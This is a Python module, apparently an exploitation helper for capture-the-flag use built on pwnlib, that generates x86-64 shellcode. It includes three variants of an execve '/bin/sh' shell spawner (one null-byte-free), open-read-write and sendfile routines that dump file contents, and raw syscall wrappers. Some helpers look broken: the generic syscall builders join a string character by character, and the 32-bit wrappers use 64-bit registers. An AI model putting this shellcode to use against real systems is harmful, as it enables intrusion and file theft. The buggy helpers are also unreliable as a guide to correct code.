#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwnlib.constants.linux import amd64 as constants
from pwnutils.osys.linux.mem import bytes2mem


""" 64 bits shellcode """


def write_to_mem(text: bytes, target):
    code = []

    code.append(f"mov rax, {target}")
    for v in bytes2mem(text, 64, "little")[::-1]:
        code.append(f"mov rbx, {hex(v)}")
        code.append("mov [rax], rbx")
        code.append("add rax, 8")

    return "\n".join(code)


def write_to_stack(text: bytes):
    code = []

    for v in bytes2mem(text, 64, "little")[::-1]:
        code.append(f"mov rax, {hex(v)}")
        code.append(f"push rax")

    return "\n".join(code)


def get_shell(code_type="standard"):
    if code_type == "standard":
        code = ["xor    rdi, rdi",
                "xor    rsi, rsi",
                "xor    rdx, rdx",
                "xor    rax, rax",
                "push   rax",
                "mov    rbx, 0x68732f2f6e69622f",
                "push   rbx",
                "mov    rdi, rsp",
                "mov    al, 59",
                "syscall"]

    elif code_type == "minimum":
        code = ["xor    rsi, rsi",
                "mul    esi",
                "mov    rbx, 0x68732f6e69622f",
                "push   rbx",
                "push   rsp",
                "pop    rdi",
                "mov    al, 59",
                "syscall"]

    elif code_type == "without 00":
        code = ["xor    rsi, rsi",
                "mul    esi",
                "push   rax",
                "mov    rbx, 0x68732f2f6e69622f",
                "push   rbx",
                "push   rsp",
                "pop    rdi",
                "mov    al, 59",
                "syscall"]

    return "\n".join(code)


def print_file_content(print_type="orw", filepath=None, buf=None, size=None):
    if print_type == "orw":
        code = []
        code += open(filepath, 0, 0)
        code += read("rax", "rsp", size)
        code += write(1, "rsp", size)

    elif print_type == "os":
        code = []
        code += open(filepath, 0, 0)
        code += sendfile(1, "rax", 0, 0x100)

    return "\n".join(code)


""" 64 bits syscall """


def read(fd, buf, count):
    """ ssize_t read(int fd, void *buf, size_t count); """

    code = [
        f"mov rdi, {fd}",
        f"mov rsi, {buf}",
        f"mov rdx, {count}",
        f"mov rax, {int(constants.__NR_read)}",  # rax = 0
        "syscall"
    ]

    return "\n".join(code)


def write(fd, buf, count):
    """ ssize_t write(int fd, void *buf, size_t count); """

    code = [
        f"mov rdi, {fd}",
        f"mov rsi, {buf}",
        f"mov rdx, {count}",
        f"mov rax, {int(constants.__NR_write)}",  # rax = 1
        "syscall"
    ]

    return "\n".join(code)


def open(pathname, flags, mode=0):
    """ int open(const char *pathname, int flags, mode_t mode); """

    code = []

    if isinstance(pathname, bytes):
        if not pathname.endswith(b"\x00"):
            pathname += b"\x00"
        code.append(write_to_stack(pathname))
        pathname = "rsp"

    code += [
        f"mov rdi, {pathname}",
        f"mov rsi, {flags}",
        f"mov rdx, {mode}",
        f"mov rax, {int(constants.__NR_open)}",  # rax = 2
        "syscall"
    ]

    return "\n".join(code)


def mmap(start, length, prot, flags, fd, offsize):
    """ void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize); """

    code = [
        f"mov rdi, {start}",
        f"mov rsi, {length}",
        f"mov rdx, {prot}",
        f"mov r10, {flags}",
        f"mov r8, {fd}",
        f"mov r9, {offsize}",
        f"mov rax, {int(constants.__NR_mmap)}",  # rax = 9
        "syscall"
    ]

    return "\n".join(code)


def sendfile(out_fd, in_fd, offset, count):
    """ ssize_t sendfile(int out_fd, int in_fd, off_t *offset, size_t count); """

    code = [
        f"mov rdi, {out_fd}",
        f"mov rsi, {in_fd}",
        f"mov rdx, {offset}",
        f"mov r10, {count}",
        f"mov rax, {int(constants.__NR_sendfile)}",  # rax = 40
        "syscall"
    ]

    return "\n".join(code)


def syscall(syscall_name, a1=None, a2=None, a3=None, a4=None, a5=None, a6=None):
    nr = getattr(constants, f"__NR_{syscall_name}")

    code = ""
    if a1:
        code += f"mov rdi, {a1}\n"
    if a2:
        code += f"mov rsi, {a2}\n"
    if a3:
        code += f"mov rdx, {a3}\n"
    if a4:
        code += f"mov r10, {a4}\n"
    if a5:
        code += f"mov r8, {a5}\n"
    if a6:
        code += f"mov r9, {a6}\n"
    code += f"mov rax, {int(nr)}\n"
    code += "syscall"

    return "\n".join(code)


""" 32 bits syscall """


def sys32_open(pathname, flags, mode=0):
    """ int open(const char *pathname, int flags, mode_t mode); """

    code = []

    if isinstance(pathname, bytes):
        if not pathname.endswith(b"\x00"):
            pathname += b"\x00"
        code.append(write_to_stack(pathname))
        pathname = "rsp"

    code += [
        f"mov rbx, {pathname}",
        f"mov rcx, {flags}",
        f"mov rdx, {mode}",
        f"mov rax, {int(constants.SYS32_open)}",  # rax = 5
        "int 0x80"
    ]

    return "\n".join(code)


def sys32_mmap(start, length, prot, flags, fd, offsize):
    """ void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize); """

    code = [
        f"mov rbx, {start}",
        f"mov rcx, {length}",
        f"mov rdx, {prot}",
        f"mov rsi, {flags}",
        f"mov rdi, {fd}",
        f"mov rbp, {offsize}",
        f"mov rax, {int(constants.SYS32_mmap)}",  # rax = 90
        "int 0x80"
    ]

    return "\n".join(code)


def sys32_getdents(fd, dirp, count):
    """ int getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count); """

    code = [
        f"mov rbx, {fd}",
        f"mov rcx, {dirp}",
        f"mov rdx, {count}",
        f"mov rax, {int(constants.SYS32_getdents)}",  # rax = 141
        "int 0x80"
    ]

    return "\n".join(code)


def sys32_mmap2(start, length, prot, flags, fd, offsize):
    """ void *mmap2(void *start, size_t length, int prot, int flags, int fd, off_t offsize); """

    code = [
        f"mov rbx, {start}",
        f"mov rcx, {length}",
        f"mov rdx, {prot}",
        f"mov rsi, {flags}",
        f"mov rdi, {fd}",
        f"mov rbp, {offsize}",
        f"mov rax, {int(constants.SYS32_mmap2)}",  # rax = 192
        "int 0x80"
    ]

    return "\n".join(code)


def sys32_syscall(syscall_name, a1=None, a2=None, a3=None, a4=None, a5=None, a6=None):
    nr = getattr(constants, f"SYS32_{syscall_name}")

    code = ""
    if a1:
        code += f"mov rbx, {a1}\n"
    if a2:
        code += f"mov rcx, {a2}\n"
    if a3:
        code += f"mov rdx, {a3}\n"
    if a4:
        code += f"mov rsi, {a4}\n"
    if a5:
        code += f"mov rdi, {a5}\n"
    if a6:
        code += f"mov rbp, {a6}\n"
    code += f"mov rax, {int(nr)}\n"
    code += "int 0x80"

    return "\n".join(code)
